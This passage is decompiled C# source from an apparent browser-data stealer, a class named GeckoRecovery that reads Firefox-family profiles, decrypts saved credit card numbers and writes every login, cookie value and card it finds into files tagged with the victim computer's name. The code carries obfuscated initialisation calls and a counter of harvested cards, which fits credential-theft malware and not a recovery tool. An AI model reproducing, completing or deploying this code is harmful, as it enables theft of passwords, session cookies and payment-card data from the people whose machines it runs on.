						CallSite <>p__6 = GeckoRecovery.<>o__3.<>p__13;
						if (GeckoRecovery.<>o__3.<>p__12 == null)
						{
							GeckoRecovery.<>o__3.<>p__12 = CallSite<Func<CallSite, object, Type, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, typeof(GeckoRecovery), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
							}));
						}
						Func<CallSite, object, Type, object> target7 = GeckoRecovery.<>o__3.<>p__12.Target;
						CallSite <>p__7 = GeckoRecovery.<>o__3.<>p__12;
						if (GeckoRecovery.<>o__3.<>p__11 == null)
						{
							GeckoRecovery.<>o__3.<>p__11 = CallSite<Func<CallSite, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "GetType", null, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						if (target6(<>p__6, target7(<>p__7, GeckoRecovery.<>o__3.<>p__11.Target(GeckoRecovery.<>o__3.<>p__11, obj), typeof(object[]))))
						{
							array = null;
						}
						else
						{
							if (GeckoRecovery.<>o__3.<>p__14 == null)
							{
								GeckoRecovery.<>o__3.<>p__14 = CallSite<Func<CallSite, object, IEnumerable>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(IEnumerable), typeof(GeckoRecovery)));
							}
							foreach (object obj7 in GeckoRecovery.<>o__3.<>p__14.Target(GeckoRecovery.<>o__3.<>p__14, obj))
							{
								if (obj7.GetType() != typeof(Dictionary<string, object>))
								{
									return null;
								}
								Dictionary<string, object> dictionary = (Dictionary<string, object>)obj7;
								if (dictionary.ContainsKey("cc-exp-month") && !(dictionary["cc-exp-month"].GetType() != typeof(int)) && dictionary.ContainsKey("cc-exp-year") && !(dictionary["cc-exp-year"].GetType() != typeof(int)) && dictionary.ContainsKey("cc-name") && !(dictionary["cc-name"].GetType() != typeof(string)) && dictionary.ContainsKey("cc-type") && !(dictionary["cc-type"].GetType() != typeof(string)) && dictionary.ContainsKey("cc-number-encrypted") && !(dictionary["cc-number-encrypted"].GetType() != typeof(string)))
								{
									string text3 = (string)dictionary["cc-name"];
									string text4 = (string)dictionary["cc-type"];
									int num = (int)dictionary["cc-exp-month"];
									int num2 = (int)dictionary["cc-exp-year"];
									string text5 = (string)dictionary["cc-number-encrypted"];
									string mozappbasenamefromProfilePath = GeckoDecrypto.GetMOZAPPBASENAMEFromProfilePath(profilePath);
									if (mozappbasenamefromProfilePath == null)
									{
										return null;
									}
									byte[] array2 = GeckoDecrypto.OsKeyStoreDecrypt(mozappbasenamefromProfilePath, text5);
									if (array2 == null)
									{
										return null;
									}
									string @string = Encoding.UTF8.GetString(array2);
									list.Add(new DataExtractionStructs.GeckoCreditCard(text3, text4, @string, num, num2));
									Counter.CreditCards++;
								}
							}
							array = list.ToArray();
						}
					}
				}
			}
			return array;
		}

		// Token: 0x0600016A RID: 362 RVA: 0x000127A0 File Offset: 0x000109A0
		public static void SaveGeckoData()
		{
			string text = Paths.InitWorkDir();
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			DataExtractionStructs.GeckoBrowser[] allInfo = GeckoRecovery.GetAllInfo(DataExtractionStructs.GeckoBrowserOptions.All);
			string text2 = DateTime.Now.ToString("yyyy-MM-dd_HH.mm.ss");
			string compname = SystemInfo.Compname;
			string text3 = Path.Combine(text, string.Concat(new string[] { "Gecko_passwords_", compname, "_", text2, ".txt" }));
			using (StreamWriter streamWriter = new StreamWriter(text3, false))
			{
				foreach (DataExtractionStructs.GeckoBrowser geckoBrowser in allInfo)
				{
					foreach (DataExtractionStructs.GeckoProfile geckoProfile in geckoBrowser.profiles)
					{
						if (geckoProfile.logins != null && geckoProfile.logins.Length != 0)
						{
							streamWriter.WriteLine("Browser: " + geckoBrowser.browserName + ", Profile: " + geckoProfile.profileName);
							streamWriter.WriteLine(geckoProfile.GetLoginsString());
							streamWriter.WriteLine(new string('-', 50));
						}
					}
				}
			}
			string text4 = Path.Combine(text, string.Concat(new string[] { "Gecko_cookies_", compname, "_", text2, ".json" }));
			List<object> list = new List<object>();
			foreach (DataExtractionStructs.GeckoBrowser geckoBrowser2 in allInfo)
			{
				foreach (DataExtractionStructs.GeckoProfile geckoProfile2 in geckoBrowser2.profiles)
				{
					if (geckoProfile2.cookies != null && geckoProfile2.cookies.Length != 0)
					{
						foreach (DataExtractionStructs.GeckoCookie geckoCookie in geckoProfile2.cookies)
						{
							list.Add(new
							{
								Browser = geckoBrowser2.browserName,
								Profile = geckoProfile2.profileName,
								Domain = geckoCookie.domain,
								Path = geckoCookie.path,
								Name = geckoCookie.name,
								Value = geckoCookie.value,
								Expiry = geckoCookie.expiry,
								IsSecure = geckoCookie.isSecure,
								IsHttpOnly = geckoCookie.isHttpOnly,
								Expired = geckoCookie.expired
							});
						}
					}
				}
			}
			File.WriteAllText(text4, JsonConvert.SerializeObject(list, 1));
			string text5 = Path.Combine(text, string.Concat(new string[] { "Gecko_credit_cards_", compname, "_", text2, ".txt" }));
			using (StreamWriter streamWriter2 = new StreamWriter(text5, false))
			{
				foreach (DataExtractionStructs.GeckoBrowser geckoBrowser3 in allInfo)
				{
					foreach (DataExtractionStructs.GeckoProfile geckoProfile3 in geckoBrowser3.profiles)
					{
						if (geckoProfile3.creditCards != null && geckoProfile3.creditCards.Length != 0)
						{
							streamWriter2.WriteLine("Browser: " + geckoBrowser3.browserName + ", Profile: " + geckoProfile3.profileName);
							streamWriter2.WriteLine(geckoProfile3.GetCreditCardsString());
							streamWriter2.WriteLine(new string('-', 50));
						}
					}
				}
			}
			Logging.Log("Data saved to: " + text, true);
		}

		// Token: 0x0600016B RID: 363 RVA: 0x000038B4 File Offset: 0x00001AB4
		public GeckoRecovery()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x0600016C RID: 364 RVA: 0x000038AD File Offset: 0x00001AAD
		static GeckoRecovery()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
